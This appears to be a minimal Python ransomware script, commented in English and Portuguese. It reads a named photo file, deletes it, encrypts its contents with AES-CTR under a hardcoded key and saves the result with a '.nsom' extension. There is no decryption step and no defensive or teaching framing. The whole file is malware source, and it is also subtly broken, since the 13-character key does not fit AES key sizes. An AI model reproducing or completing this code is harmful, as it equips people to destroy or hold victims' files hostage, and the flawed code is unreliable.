#Import of functionallity (Importação de funcionalidades)
import os
import pyaes

#Open the file u want (Abrir o arquivo)
file_name = "foto.jpg"
file = open(file_name, "rb")
fileData = file.read()
file.close()

#Remove the file (Remover o arquivo)
os.remove(file_name)

#Cryptography Key (Chave para criptografar)
key = "DeusNoComand0"
aes = pyaes.AESModeOfOperationCTR(key)
cryptData = aes.encrypt(fileData)

newFileName = file_name + ".nsom"
newFile = open(newFileName, "wb")
newFile.write(cryptData)
newFile.close()
